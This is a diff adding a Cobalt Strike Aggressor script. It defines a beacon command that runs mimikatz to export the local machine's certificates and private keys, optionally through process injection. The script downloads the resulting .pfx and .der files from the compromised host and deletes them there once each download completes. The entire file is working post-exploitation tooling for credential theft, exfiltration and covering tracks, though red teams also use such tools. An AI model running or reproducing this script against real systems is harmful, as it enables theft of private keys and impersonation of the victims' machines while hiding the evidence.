@@ -1,0 +1,169 @@
+# Declare global variables
+global('@remove_file_on_complete $client $dataMgr');
+
+# An array to hold a list of (bid, filename) to remove from the
+# target system (bid) when the file has been downloaded
+@remove_file_on_complete = @();
+
+# This callback is fired for any download event
+# This will look for bid and filename pairs from the @remove_file_on_complete
+# array and validate that the file has been completely downloaded before
+# removing the file from the target system.
+#
+# $1 - A single object of instance type Download
+#
+sub checkDownload {
+   # Declare local variables
+   local('%download $bid $name $size $rcvd $index $value');
+
+   # Convert to Sleep Scaler Map
+   %download = [$1 toScalar];
+
+   # Set items that are of interest
+   $bid  = %download["bid"];
+   $name = %download["name"];
+   $size = %download["size"];
+   $rcvd = %download["rcvd"];
+
+   # println("look for file: " . $name);
+   # println("before: " . @remove_file_on_complete);
+   foreach $index => $value (@remove_file_on_complete) {
+      if ($bid eq $value[0] && $name eq $value[1] && $size == $rcvd) {
+         # println("Remove file from target: " . $value[0] . " - " . $name);
+         brm($value[0], $value[1]); # task beacon to remove file
+         remove(); # Remove $value from @remove_file_on_complete
+         break();
+      }
+   }
+   # println("after: " . @remove_file_on_complete);
+}
+
+# Process the output from the mimikatz crypto::certificates module
+# and look for any Public or Private export files.  If found then
+# task beacon to download them and setup information so once the
+# download is complete the files will be removed from the target.
+#
+# $1 - beacon id
+# $2 - result
+# $3 - info - Map containing information about the result
+#
+sub get_certificates {
+   # Declare local variables
+   local('$bid $result %info $pattern @lines $line $type $file');
+
+   # Assign parameters user friendly names
+   ($bid, $result, %info) = @_;
+   #println("**** get_certificates for bmimikatz");
+   #println("**** arg1 (bid): $1");
+   #println("**** arg2 (rest of output):\n$2");
+   #println("**** arg3 (info): " . %info);
+
+   # Log the output back to beacon console
+   blog($bid, "received output:\n" . $result);
+
+   # Search for files to download (example)
+   #    Public export  : OK - '<file>.der'
+   #    Private export : OK - '<file>.pfx'
+   $pattern = '\s*(Public|Private) export\s*: OK - \'(.*)\'';
+   @lines = split('\n', $2);
+   foreach $line (@lines) {
+      #println("check line: " . $line);
+      if ($line ismatch $pattern) {
+         ($type, $file) = matched();
+         add(@remove_file_on_complete, @($bid, $file));
+         #println("Added file to remove_file_on_complete: " . @remove_file_on_complete);
+         #println("Download the file: " . $file);
+         bdownload($bid, $file); # task beacon to download file
+      }
+   }
+
+   #println("**** get_certificates done");
+}
+
+beacon_command_register(
+   "cs_export_certificates",
+   "Export certificates using mimikatz crypto::certificates module",
+
+   "Export certificates using mimikatz crypto::certificates module\n" .
+   "Automatically download them from the target and remove them from\n" .
+   "the target once the download is completed\n\n" .
+
+   "Usage:\n" .
+   "   cs_export_certificates [options]\n\n" .
+
+   "Arguments:\n" .
+   "   \$1 - beacon id (CS automatically adds this argument)\n\n" .
+
+   "Options (specified in any order):\n" .
+   "   --pid <pid>          - pid to inject into or use for fork&run\n" .
+   "   --arch <arch>        - arch of the pid to inject into use for fork&run\n\n" .
+
+   "Examples (fork and run):\n" .
+   "   cs_export_certificates\n\n" .
+
+   "Examples (process injection):\n" .
+   "   cs_export_certificates --pid 1234 --arch x64\n\n"
+);
+
+alias cs_export_certificates {
+   # Declare local variables
+   local('$bid @valid_opts %opts $opt_cnt $opt_ind $opt $value $info $command');
+
+   # Assign parameters to the opts hash map
+   $bid = @_[0];
+   $opt_cnt = size(@_);
+   @valid_opts = @("--pid", "--arch");
+   for($opt_ind = 1; $opt_ind < $opt_cnt; $opt_ind++) {
+      # Set the arg and value for this iteration
+      $opt = @_[$opt_ind];
+      $opt_ind++;
+      $value = iff( $opt_ind >= $opt_cnt, $null, @_[$opt_ind] );
+
+      # Do some simple validation on opt and value
+      if ($opt !in @valid_opts) {
+         berror($bid, "$opt is not a valid option.");
+         return;
+      }
+      if ($value is $null || $value in @valid_opts) {
+         berror($bid, "Missing or invalid value for the $opt option.");
+         return;
+      }
+
+      # Save the opt and value into the opts hash
+      %opts[$opt] = $value;
+   }
+
+   # Validate options
+   if ( (%opts["--pid"] !is $null) || (%opts["--arch"] !is $null) ) {
+      # At least one process injection options is used, validate them.
+      if (!-isnumber %opts["--pid"] || %opts["--pid"] < 0) {
+         berror($bid, "pid is not a valid: " . %opts["--pid"]);
+         return;
+      }
+      if (%opts["--arch"] !in @("x86", "x64")) {
+         berror($bid, "arch is not valid, must be x86 or x64.");
+         return;
+      }
+   }
+
+   # Build up the mimikatz commands to export the certificates
+   $command = "crypto::capi ; crypto::certificates /systemstore:local_machine /store:my /export";
+
+   # Print some info to the script console
+   $info = "beacon: $bid will execute \'$command\'";
+   if (%opts["--pid"] >= 0 && %opts["--arch"] in @("x86", "x64")) {
+      $info .= " using process injection: \(\'" . %opts["--pid"] . "\' \'" . %opts["--arch"] . "\'\)";
+   } else {
+      $info .= " using fork&run";
+   }
+   println("$info");
+
+   # Execute the command
+   bmimikatz($bid, $command, %opts["--pid"], %opts["--arch"], &get_certificates);
+}
+
+# Setup a subscription to the downloads topic.
+$client = getAggressorClient();
+$dataMgr = [$client getData];
+[$dataMgr subscribe: "downloads", { checkDownload($2); }];
+
